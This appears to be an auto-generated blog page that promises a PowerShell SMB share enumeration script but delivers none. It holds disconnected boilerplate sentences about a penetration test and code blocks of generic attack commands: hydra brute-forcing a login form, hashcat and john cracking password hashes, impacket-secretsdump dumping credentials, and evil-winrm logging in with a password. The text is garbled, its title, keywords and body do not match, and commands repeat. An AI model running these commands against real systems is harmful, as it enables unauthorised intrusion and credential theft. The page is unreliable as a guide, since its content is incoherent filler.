---
TitleSEO: "SMB Share Enumeration Script in PowerShell | ZureFX"
TitlePost: "SMB Share Enumeration Script — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for smb share enumeration script. Built for security research and automation."
Keywords: "fuzzer, powershell, parser"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-236.html"
URL_IMAGES: ""
Date: "2024-01-26"
Tags: "Fuzzer, PowerShell, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-236"
Permalink: "/scripting/script-smb-share-enumeration-script-236.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `gobuster`
- `wmiexec`
- `atexec`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.67.71 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.182.222 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

## Usage

### Basic Usage

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.88.189
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.30.100.65/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.151.156
nmap -sCV -p23,5985,23 10.38.14.65 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.114.21.93 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 7.02s
```
